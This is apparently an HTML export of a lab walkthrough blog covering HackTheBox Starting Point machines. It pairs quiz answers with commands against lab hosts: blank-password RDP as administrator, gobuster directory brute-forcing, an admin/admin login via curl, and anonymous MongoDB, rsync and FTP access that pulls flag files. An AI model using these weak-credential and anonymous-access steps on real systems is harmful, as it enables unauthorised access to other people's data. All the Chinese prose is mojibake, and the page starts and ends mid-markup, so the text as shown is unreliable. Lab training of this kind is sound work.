class="comment">#è·å–flagé”®å€¼</span></span><br></pre></td></tr></table></figure><p>ã€åŠ¨æ€flagï¼Œä¸èƒ½å±•ç¤º.pngã€‘</p><h4 id="ä»€ä¹ˆæ˜¯Redis"><a href="#ä»€ä¹ˆæ˜¯Redis" class="headerlink" title="ä»€ä¹ˆæ˜¯Redis"></a>ä»€ä¹ˆæ˜¯Redis</h4><blockquote><p><strong>Redis</strong> (REmote DIctionary Server) æ˜¯ä¸€ç§å¼€æºçš„é«˜çº§ <code>NoSQL</code> <strong>é”®å€¼æ•°æ®å­˜å‚¨</strong>ï¼Œç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ã€‚</p><p>æ•°æ®ä»¥å…·æœ‰é”®å€¼å¯¹çš„å­—å…¸æ ¼å¼å­˜å‚¨ã€‚æ•°æ®åº“å­˜å‚¨åœ¨<code>æœåŠ¡å™¨çš„ RAMï¼ˆå†…å­˜ä¸­ï¼‰</code>ä¸­ä»¥å®ç°å¿«é€Ÿæ•°æ®è®¿é—®ã€‚Redis è¿˜ä¼šä»¥ä¸åŒçš„æ—¶é—´é—´éš”å°†æ•°æ®åº“çš„å†…å®¹å†™å…¥ç£ç›˜ï¼Œä»¥åœ¨<code>å‘ç”Ÿæ•…éšœæ—¶å°†å…¶ä½œä¸ºå¤‡ä»½æŒä¹…ä¿å­˜</code>ã€‚</p><p>Redis æ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ ANSI C è¯­è¨€ç¼–å†™ã€éµå®ˆ BSD åè®®ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜ã€åˆ†å¸ƒå¼ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹(Key-Value)å­˜å‚¨æ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„ APIã€‚</p><p>Redis é€šå¸¸è¢«ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ï¼Œå› ä¸ºå€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯å­—ç¬¦ä¸²(String)ã€å“ˆå¸Œ(Hash)ã€åˆ—è¡¨(list)ã€é›†åˆ(sets)å’Œæœ‰åºé›†åˆ(sorted sets)ç­‰ç±»å‹ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯NoSQL"><a href="#ä»€ä¹ˆæ˜¯NoSQL" class="headerlink" title="ä»€ä¹ˆæ˜¯NoSQL"></a>ä»€ä¹ˆæ˜¯NoSQL</h4><blockquote><p>NoSQLï¼Œæ³›æŒ‡éå…³ç³»å‹çš„æ•°æ®åº“ã€‚</p><p>éšç€äº’è”ç½‘<a href="https://baike.baidu.com/item/web2.0/97695">web2.0</a>ç½‘ç«™çš„å…´èµ·ï¼Œä¼ ç»Ÿçš„å…³ç³»æ•°æ®åº“åœ¨å¤„ç†web2.0ç½‘ç«™ï¼Œç‰¹åˆ«æ˜¯è¶…å¤§è§„æ¨¡å’Œé«˜å¹¶å‘çš„<a href="https://baike.baidu.com/item/SNS/10242">SNS</a>ç±»å‹çš„web2.0çº¯<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91">åŠ¨æ€ç½‘</a>ç«™å·²ç»æ˜¾å¾—åŠ›ä¸ä»å¿ƒï¼Œå‡ºç°äº†å¾ˆå¤šéš¾ä»¥å…‹æœçš„é—®é¢˜ï¼Œè€Œéå…³ç³»å‹çš„æ•°æ®åº“åˆ™ç”±äºå…¶æœ¬èº«çš„ç‰¹ç‚¹å¾—åˆ°äº†éå¸¸è¿…é€Ÿçš„å‘å±•ã€‚</p><p>NoSQLæ•°æ®åº“çš„äº§ç”Ÿå°±æ˜¯ä¸ºäº†è§£å†³å¤§è§„æ¨¡æ•°æ®é›†åˆå¤šé‡æ•°æ®ç§ç±»å¸¦æ¥çš„æŒ‘æˆ˜ï¼Œç‰¹åˆ«æ˜¯å¤§æ•°æ®åº”ç”¨éš¾é¢˜ã€‚</p></blockquote><h2 id="Â·Explosion"><a href="#Â·Explosion" class="headerlink" title="Â·Explosion"></a>Â·Explosion</h2><h3 id="Tags-4"><a href="#Tags-4" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>ç¼–ç¨‹</code></p><p><code>RDP</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>å¼±å‡­è¯</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ RDP ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Remote Desktop Protocol</code>ï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰</li><li>è¡¨ç¤ºé€šè¿‡å‘½ä»¤è¡Œç•Œé¢ä¸ä¸»æœºäº¤äº’çš„ä¸‰ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©å†™è¯æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>CLI</code></li><li>é‚£ä¹ˆå›¾å½¢ç”¨æˆ·ç•Œé¢äº¤äº’å‘¢ï¼Ÿï¼š<code>GUI</code></li><li>é»˜è®¤æƒ…å†µä¸‹æœªåŠ å¯†çš„æ—§è¿œç¨‹è®¿é—®å·¥å…·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>telnet</code></li><li>åœ¨ TCP 3389 ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ<code>ms-wbt-server</code>(RDPæœåŠ¡ï¼Œé»˜è®¤ç«¯å£3389)</li><li>ä½¿ç”¨ xfreerdp æ—¶ç”¨äºæŒ‡å®šç›®æ ‡ä¸»æœº IP åœ°å€çš„å¼€å…³æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>/v:</code>(æ‰“å¼€å·¥å…·å³å¯æŸ¥çœ‹)</li><li>ä»€ä¹ˆç”¨æˆ·åä½¿ç”¨ç©ºç™½å¯†ç æˆåŠŸè¿”å›æ¡Œé¢æŠ•å½±ç»™æˆ‘ä»¬ï¼Ÿï¼š <code>administrator</code>ï¼ˆwindowsç”¨æˆ·çš„æœ€é«˜æƒé™ï¼‰</li></ol></blockquote><h4 id="å‘½ä»¤xfreerdp"><a href="#å‘½ä»¤xfreerdp" class="headerlink" title="å‘½ä»¤xfreerdp"></a>å‘½ä»¤xfreerdp</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp <span class="regexp">/v:10.129.31.107 /u</span>:administrator</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127174214417.png" alt="image-20230127174214417"></p><h4 id="ä»€ä¹ˆæ˜¯RDP"><a href="#ä»€ä¹ˆæ˜¯RDP" class="headerlink" title="ä»€ä¹ˆæ˜¯RDP"></a>ä»€ä¹ˆæ˜¯RDP</h4><blockquote><p><strong>è¿œç¨‹æ¡Œé¢</strong>åè®® ( <strong>RDP</strong> ) æ˜¯ Microsoft å¼€å‘çš„ä¸“æœ‰åè®®ï¼Œå®ƒ<code>ä¸ºç”¨æˆ·æä¾›å›¾å½¢ç•Œé¢ä»¥é€šè¿‡ç½‘ç»œè¿æ¥åˆ°å¦ä¸€å°è®¡ç®—æœº</code>ã€‚ç”¨æˆ·ä¸ºæ­¤ç›®çš„ä½¿ç”¨<strong>RDPå®¢æˆ·ç«¯è½¯ä»¶ï¼Œè€Œå¦ä¸€å°è®¡ç®—æœºå¿…é¡»è¿è¡Œ</strong> <strong>RDP</strong>æœåŠ¡å™¨è½¯ä»¶</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯freerdp"><a href="#ä»€ä¹ˆæ˜¯freerdp" class="headerlink" title="ä»€ä¹ˆæ˜¯freerdp"></a>ä»€ä¹ˆæ˜¯freerdp</h4><blockquote><p>FreeRDPæ˜¯ä¸€ä¸ªRemote Desktop Protocolï¼ˆåè®®ï¼‰çš„ä¸€ä¸ªå®ç°ï¼Œéµå¾ªApacheå¼€æºåè®®ï¼Œ<code>æ”¯æŒ3DåŠŸèƒ½ï¼Œå¹¶æœ‰è¾ƒé«˜åˆ·æ–°ç‡ï¼Œä¹Ÿæ”¯æŒRemoteFXï¼ŒH264ç¼–è§£ç ï¼Œç”¨æˆ·ç®¡ç†ï¼ŒéŸ³é¢‘ä»¥åŠå¤–è®¾é‡å®šå‘</code>ç­‰åŠŸèƒ½ã€‚</p></blockquote><h2 id="Preignition"><a href="#Preignition" class="headerlink" title="Preignition"></a>Preignition</h2><h3 id="Tags-5"><a href="#Tags-5" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>ä¼ ç»Ÿåº”ç”¨</code></p><p><code>Apache</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p><p><code>é»˜è®¤å‡­è¯</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-5"><a href="#çŸ¥è¯†ç‚¹-5" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li><p>ç›®å½•æš´åŠ›ç ´è§£æ˜¯ä¸€ç§ç”¨äºæ£€æŸ¥ Web æœåŠ¡å™¨ä¸Šçš„è®¸å¤šè·¯å¾„ä»¥æŸ¥æ‰¾éšè—é¡µé¢çš„æŠ€æœ¯ã€‚å¦å«åšï¼Ÿ:<code>dir busting</code></p></li><li><p>nmapçš„æ‰«æç”¨ä»€ä¹ˆswitchæ¥æŒ‡å®šæˆ‘ä»¬è¦è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ï¼š<code>-sV</code></p></li><li><p>æˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šæˆ‘ä»¬è¦ä¸“é—¨æ‰§è¡Œ dir busting çš„ Gobusterï¼Ÿï¼š<code>dir</code></p></li><li><p>å½“ä½¿ç”¨ gobuster åˆ° dir bust æ—¶ï¼Œæˆ‘ä»¬æ·»åŠ ä»€ä¹ˆå¼€å…³ä»¥ç¡®ä¿å®ƒæ‰¾åˆ° PHP é¡µé¢ï¼Ÿï¼š<code>-x php</code></p></li></ol></blockquote><h4 id="å‘½ä»¤gobuster"><a href="#å‘½ä»¤gobuster" class="headerlink" title="å‘½ä»¤gobuster"></a>å‘½ä»¤gobuster</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirb<span class="regexp">/common.txt -u http:/</span><span class="regexp">/10.129.158.233/</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127211339954.png" alt="image-20230127211339954"></p><p>ã€ä¸‹é¢æ˜¯ç”±äºæˆ‘ç”¨çš„wslï¼Œæ²¡ç”¨vmï¼Œæ— æ³•å¯åŠ¨chromeï¼Œäºæ˜¯ç”¨curlä¼ postç™»å½•æ•°æ®ï¼Œæ²¡æœ‰è¦æ±‚ç›´æ¥å¼±å¯†ç ã€‘</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://10.129.158.233/admin.php -X POST -d <span class="string">&quot;username=admin&amp;password=adm</span></span><br><span class="line"><span class="string">in&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127211215675.png" alt="image-20230127211215675"></p><h4 id="ä»€ä¹ˆæ˜¯Gobuster"><a href="#ä»€ä¹ˆæ˜¯Gobuster" class="headerlink" title="ä»€ä¹ˆæ˜¯Gobuster"></a>ä»€ä¹ˆæ˜¯Gobuster</h4><blockquote><p>Gobusteræ˜¯Kali Linuxé»˜è®¤å®‰è£…çš„ä¸€æ¬¾æš´åŠ›æ‰«æå·¥å…·ã€‚ å®ƒæ˜¯ä½¿ç”¨Goè¯­è¨€ç¼–å†™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå…·å¤‡ä¼˜å¼‚çš„æ‰§è¡Œæ•ˆç‡å’Œå¹¶å‘æ€§èƒ½ã€‚ è¯¥å·¥å…·æ”¯æŒå¯¹å­åŸŸåå’ŒWebç›®å½•è¿›è¡ŒåŸºäºå­—å…¸çš„æš´åŠ›æ‰«æã€‚</p></blockquote><h2 id="Mongod"><a href="#Mongod" class="headerlink" title="*Mongod"></a>*Mongod</h2><h3 id="Tags-6"><a href="#Tags-6" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>MongoDB </code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ç½‘ç»œ</code></p><p><code>æ•°æ®åº“</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>é…ç½®é”™è¯¯</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-6"><a href="#çŸ¥è¯†ç‚¹-6" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li><p>MongoDB æ˜¯ä»€ä¹ˆç±»å‹çš„æ•°æ®åº“ï¼Ÿï¼š <code>NoSQL</code></p></li><li><p>ä¸ mongodb-clients è½¯ä»¶åŒ…ä¸€èµ·å®‰è£…çš„ Mongo shell çš„å‘½ä»¤åç§°æ˜¯ä»€ä¹ˆï¼Ÿ: <code>mongo</code></p></li><li><p>ç”¨äºåˆ—å‡º MongoDB æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ‰€æœ‰æ•°æ®åº“çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ: <code>show dbs</code></p></li><li><p>ç”¨äºåˆ—å‡ºæ•°æ®åº“ä¸­é›†åˆçš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿï¼š <code>show collections</code></p></li><li><p>å°†åä¸º flag çš„é›†åˆä¸­æ‰€æœ‰æ–‡æ¡£çš„å†…å®¹ä»¥æ˜“äºé˜…è¯»çš„æ ¼å¼è½¬å‚¨çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ: <code>db.flag.find().pretty()</code></p></li></ol></blockquote><h4 id="å‘½ä»¤mongo"><a href="#å‘½ä»¤mongo" class="headerlink" title="å‘½ä»¤mongo"></a>å‘½ä»¤mongo</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo mongodb:<span class="regexp">//</span><span class="number">10.129</span>.<span class="number">173.130</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129215710939.png" alt="image-20230129215710939"></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129215752293.png" alt="image-20230129215752293"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> sensitive_information</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129215912471.png" alt="image-20230129215912471"></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129215847534.png" alt="image-20230129215847534"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db<span class="selector-class">.flag</span><span class="selector-class">.find</span>()<span class="selector-class">.pretty</span>()</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129215955916.png" alt="image-20230129215955916"></p><h4 id="ä»€ä¹ˆæ˜¯MongoDB"><a href="#ä»€ä¹ˆæ˜¯MongoDB" class="headerlink" title="ä»€ä¹ˆæ˜¯MongoDB"></a>ä»€ä¹ˆæ˜¯MongoDB</h4><blockquote><p>MongoDBæ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨ [1] çš„æ•°æ®åº“ã€‚ç”±<a href="https://baike.baidu.com/item/C%2B%2B?fromModule=lemma_inlink">C++</a>è¯­è¨€ç¼–å†™ã€‚æ—¨åœ¨ä¸ºWEBåº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚</p><p>MongoDBæ˜¯ä¸€ä¸ªä»‹äº<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93?fromModule=lemma_inlink">å…³ç³»æ•°æ®åº“</a>å’Œéå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚å®ƒæ”¯æŒçš„æ•°æ®ç»“æ„éå¸¸æ¾æ•£ï¼Œæ˜¯ç±»ä¼¼<a href="https://baike.baidu.com/item/json?fromModule=lemma_inlink">json</a>çš„<a href="https://baike.baidu.com/item/bson?fromModule=lemma_inlink">bson</a>æ ¼å¼ï¼Œå› æ­¤å¯ä»¥å­˜å‚¨æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç±»å‹ã€‚Mongoæœ€å¤§çš„ç‰¹ç‚¹æ˜¯å®ƒæ”¯æŒçš„æŸ¥è¯¢è¯­è¨€éå¸¸å¼ºå¤§ï¼Œå…¶è¯­æ³•æœ‰ç‚¹ç±»ä¼¼äºé¢å‘å¯¹è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œå‡ ä¹å¯ä»¥å®ç°ç±»ä¼¼å…³ç³»æ•°æ®åº“å•è¡¨æŸ¥è¯¢çš„ç»å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ”¯æŒå¯¹æ•°æ®å»ºç«‹<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95?fromModule=lemma_inlink">ç´¢å¼•</a>ã€‚</p></blockquote><h2 id="Synced"><a href="#Synced" class="headerlink" title="*Synced"></a>*Synced</h2><h3 id="Tags-7"><a href="#Tags-7" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>Rsync</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ç½‘ç»œ</code></p><p><code>åè®®</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-7"><a href="#çŸ¥è¯†ç‚¹-7" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>rsync çš„é»˜è®¤ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>873</code></li><li>Linux ä¸Šä¸ rsync äº¤äº’çš„æœ€å¸¸ç”¨å‘½ä»¤åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>rsync</code> </li><li>æ‚¨å¿…é¡»å‘ rsync ä¼ é€’å“ªäº›å‡­æ®æ‰èƒ½ä½¿ç”¨åŒ¿åèº«ä»½éªŒè¯ï¼Ÿï¼š<code>None</code>(æ— )</li><li>ä»…åˆ—å‡º rsync ä¸Šçš„å…±äº«å’Œæ–‡ä»¶çš„é€‰é¡¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæ— éœ€åŒ…æ‹¬å‰å¯¼ â€“ å­—ç¬¦ï¼‰ï¼š<code>list-only</code></li></ol></blockquote><h4 id="å‘½ä»¤rsync"><a href="#å‘½ä»¤rsync" class="headerlink" title="å‘½ä»¤rsync"></a>å‘½ä»¤rsync</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rsync</span> --list-only <span class="number">10.129.33.133</span>::</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129222433250.png" alt="image-20230129222433250"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --list-only <span class="number">10.129.33.133</span><span class="number">::</span>public</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129222509164.png" alt="image-20230129222509164"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync <span class="number">10.129</span>.<span class="number">33.133</span><span class="symbol">:</span><span class="symbol">:public/flag</span>.txt flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230129223114091.png" alt="image-20230129223114091"></p><h4 id="ä»€ä¹ˆæ˜¯rsync"><a href="#ä»€ä¹ˆæ˜¯rsync" class="headerlink" title="ä»€ä¹ˆæ˜¯rsync"></a>ä»€ä¹ˆæ˜¯rsync</h4><blockquote><p>rsyncæ˜¯<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935?fromModule=lemma_inlink">linuxç³»ç»Ÿ</a>ä¸‹çš„æ•°æ®é•œåƒå¤‡ä»½å·¥å…·ã€‚ä½¿ç”¨å¿«é€Ÿå¢é‡å¤‡ä»½å·¥å…·Remote Syncå¯ä»¥è¿œç¨‹åŒæ­¥ï¼Œæ”¯æŒæœ¬åœ°å¤åˆ¶ï¼Œæˆ–è€…ä¸å…¶ä»–SSHã€rsyncä¸»æœºåŒæ­¥ã€‚</p><p>å·²æ”¯æŒè·¨å¹³å°ï¼Œå¯ä»¥åœ¨Windowsä¸Linuxé—´è¿›è¡Œæ•°æ®åŒæ­¥ã€‚</p></blockquote><h1 id="ç¬¬1å±‚"><a href="#ç¬¬1å±‚" class="headerlink" title="ç¬¬1å±‚"></a>ç¬¬1å±‚</h1><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><h3 id="Tags-8"><a href="#Tags-8" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>æ•°æ®åº“</code></p><p><code>æ³¨å…¥</code></p><p><code>Apache</code></p><p><code>SQL</code></p><p><code>PHP</code></p><p><code>æ•°æ®åº“</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>SQLæ³¨å…¥</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-8"><a href="#çŸ¥è¯†ç‚¹-8" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>SQL çš„ç¼©å†™ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Structured Query Language</code>ï¼ˆç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼‰</li><li>æœ€å¸¸è§çš„ SQL æ¼æ´ç±»å‹ä¹‹ä¸€æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>SQL injection</code>ï¼ˆSQLæ³¨å…¥ï¼‰</li><li>PII ä»£è¡¨ä»€ä¹ˆï¼Ÿï¼š<code>Personally Identifiable Information</code>ï¼ˆä¸ªäººèº«ä»½ä¿¡æ¯ï¼‰</li><li>æ­¤æ¼æ´çš„ 2021 OWASP Top 10 åˆ†ç±»æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>A03:2021-Injection</code></li><li>HTTPS åè®®ä½¿ç”¨çš„æ ‡å‡†ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>443</code></li><li>Web åº”ç”¨ç¨‹åºæœ¯è¯­ä¸­çš„æ–‡ä»¶å¤¹æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>directory</code></li><li>â€œæœªæ‰¾åˆ°â€é”™è¯¯çš„ HTTP å“åº”ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>404</code></li><li>å¦‚æœä¸å°å¿ƒå¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå®ƒå¯èƒ½ä¼šè¢«è§£é‡Šä¸ºè¯„è®ºã€‚åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨è¯„è®ºä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚è¿”å›çš„ç½‘é¡µä¸Šçš„ç¬¬ä¸€ä¸ªè¯æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>Congratulations</code></li></ol></blockquote><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Tags-9"><a href="#Tags-9" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>æ¼æ´è¯„ä¼°</code></p><p><code>æ•°æ®åº“</code></p><p><code>MySQL</code></p><p><code>SQL</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>å¼±å‡­è¯</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-9"><a href="#çŸ¥è¯†ç‚¹-9" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>å“ªä¸ªç«¯å£ä¸º MySQL æä¾›æœåŠ¡ï¼Ÿï¼š<code>3306</code></li><li>ä½¿ç”¨ MySQL å‘½ä»¤è¡Œå®¢æˆ·ç«¯æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šç™»å½•ç”¨æˆ·åï¼Ÿï¼š<code>-u</code></li><li>åœ¨ SQL ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»€ä¹ˆç¬¦å·æ¥åœ¨æŸ¥è¯¢ä¸­æŒ‡å®šæˆ‘ä»¬è¦æ˜¾ç¤ºè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Ÿ:<code>*</code></li></ol></blockquote><h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Tags-10"><a href="#Tags-10" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>ä¼ ç»Ÿåº”ç”¨</code></p><p><code>åè®®</code></p><p><code>Apache</code></p><p><code>FTP</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p><p><code>æ˜æ–‡å‡­è¯</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-10"><a href="#çŸ¥è¯†ç‚¹-10" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>ä»€ä¹ˆ Nmap æ‰«æå¼€å…³åœ¨æ‰«ææœŸé—´ä½¿ç”¨é»˜è®¤è„šæœ¬ï¼Ÿï¼š<code>-sC</code></li><li>â€œå…è®¸åŒ¿å FTP ç™»å½•â€æ¶ˆæ¯è¿”å›ç»™æˆ‘ä»¬çš„ FTP ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>230</code></li><li>ä½¿ç”¨ ftp å®¢æˆ·ç«¯è¿æ¥åˆ° FTP æœåŠ¡å™¨åï¼Œå½“æç¤ºåŒ¿åç™»å½•æ—¶ï¼Œæˆ‘ä»¬æä¾›ä»€ä¹ˆç”¨æˆ·åï¼Ÿï¼š<code>anonymous</code></li><li>åŒ¿åè¿æ¥åˆ°FTPæœåŠ¡å™¨åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥ä¸‹è½½æˆ‘ä»¬åœ¨FTPæœåŠ¡å™¨ä¸Šæ‰¾åˆ°çš„æ–‡ä»¶å‘¢ï¼Ÿï¼š<code>get</code></li><li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Gobuster çš„ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ç‰¹å®šçš„æ–‡ä»¶ç±»å‹ï¼š<code>-x</code></li></ol></blockquote><h4 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230130000838109.png" alt="image-20230130000838109"></p><p><img src="/2022/09/23/STARTING-POINT/image-20230130000857706.png" 